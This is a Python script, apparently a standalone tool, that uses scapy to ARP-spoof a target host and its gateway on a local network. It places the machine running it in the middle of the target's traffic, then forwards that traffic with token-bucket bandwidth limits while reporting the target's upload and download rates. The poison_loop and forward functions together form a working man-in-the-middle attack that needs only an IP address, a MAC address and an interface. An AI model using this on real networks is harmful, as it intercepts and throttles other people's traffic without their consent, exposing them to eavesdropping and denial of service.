#!/usr/bin/env python3
"""MITM ARP spoof with token-bucket throttle (Windows/Linux, NetCut-style speed limit)."""

import json
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from scapy.all import ARP, Ether, IP, conf, get_if_hwaddr, getmacbyip, sendp, sniff
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)

from iface_util import resolve_iface


def normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").lower()


class TokenBucket:
    def __init__(self, kbps: int):
        self.unlimited = kbps <= 0 or kbps >= 900_000
        self.rate = max(0, kbps) * 1024 / 8
        self.tokens = self.rate * 2 if self.rate else 0
        self.max_burst = self.rate * 2 if self.rate else 0
        self.last = time.time()

    def allow(self, nbytes: int) -> bool:
        if self.unlimited:
            return True
        now = time.time()
        elapsed = now - self.last
        self.last = now
        self.tokens = min(self.max_burst, self.tokens + elapsed * self.rate)
        if self.tokens >= nbytes:
            self.tokens -= nbytes
            return True
        return False


def main():
    if len(sys.argv) < 7:
        print(
            "Usage: arp_throttle.py <target_ip> <target_mac> <gateway_ip> "
            "<upload_kbps> <download_kbps> <iface>",
            file=sys.stderr,
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = normalize_mac(sys.argv[2])
    gateway_ip = sys.argv[3]
    upload_kbps = int(sys.argv[4])
    download_kbps = int(sys.argv[5])
    iface_name = sys.argv[6]
    local_ip = sys.argv[7] if len(sys.argv) > 7 else ""
    iface = resolve_iface(iface_name, local_ip)

    conf.iface = iface
    conf.verb = 0

    our_mac = normalize_mac(get_if_hwaddr(iface))
    up_bucket = TokenBucket(upload_kbps)
    down_bucket = TokenBucket(download_kbps)
    gateway_mac = None
    traffic = {"tx": 0, "rx": 0}

    def emit_traffic():
        last_tx, last_rx, last_t = 0, 0, time.time()
        while True:
            time.sleep(2)
            now = time.time()
            dt = now - last_t
            dtx, drx = traffic["tx"] - last_tx, traffic["rx"] - last_rx
            last_tx, last_rx, last_t = traffic["tx"], traffic["rx"], now
            if dt <= 0:
                continue
            print(
                json.dumps(
                    {
                        "type": "traffic",
                        "ip": target_ip,
                        "mac": target_mac,
                        "upload": round(max(0, (dtx * 8) / (dt * 1024 * 1024)), 3),
                        "download": round(max(0, (drx * 8) / (dt * 1024 * 1024)), 3),
                    }
                ),
                flush=True,
            )

    def resolve_gateway_mac():
        nonlocal gateway_mac
        try:
            mac = getmacbyip(gateway_ip)
            if mac:
                gateway_mac = normalize_mac(mac)
        except Exception:
            pass
        return gateway_mac or "ff:ff:ff:ff:ff:ff"

    def poison_loop():
        while True:
            gw_mac = resolve_gateway_mac()
            sendp(
                Ether(dst=target_mac)
                / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            sendp(
                Ether(dst=gw_mac)
                / ARP(op=2, pdst=gateway_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            time.sleep(2)

    def forward(pkt):
        if IP not in pkt or Ether not in pkt:
            return

        ip = pkt[IP]
        nbytes = int(ip.len) if ip.len else len(ip)

        if ip.src == target_ip:
            if not up_bucket.allow(nbytes):
                return
            traffic["tx"] += nbytes
            gw_mac = resolve_gateway_mac()
            fwd = Ether(src=our_mac, dst=gw_mac) / ip
            sendp(fwd, iface=iface, verbose=0)
        elif ip.dst == target_ip:
            if not down_bucket.allow(nbytes):
                return
            traffic["rx"] += nbytes
            fwd = Ether(src=our_mac, dst=target_mac) / ip
            sendp(fwd, iface=iface, verbose=0)

    print(
        f"Throttling {target_ip} upload={upload_kbps}kbit download={download_kbps}kbit",
        flush=True,
    )
    threading.Thread(target=poison_loop, daemon=True).start()
    threading.Thread(target=emit_traffic, daemon=True).start()
    sniff(filter=f"ip host {target_ip}", prn=forward, store=0, promisc=True, iface=iface)


if __name__ == "__main__":
    main()
